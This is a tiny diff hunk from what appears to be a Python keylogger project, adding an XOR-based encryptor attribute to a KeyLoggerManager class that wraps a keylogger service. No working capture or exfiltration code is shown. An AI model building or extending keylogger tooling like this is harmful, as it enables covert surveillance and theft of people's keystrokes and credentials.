@@ -8,6 +8,7 @@ class KeyLoggerManager:
 
     def __init__(self):
         self.instance = KeyloggerService()
+        self.encryptor :  IEncryptor = XorEnc
 
     def start(self):
         self.instance.start()
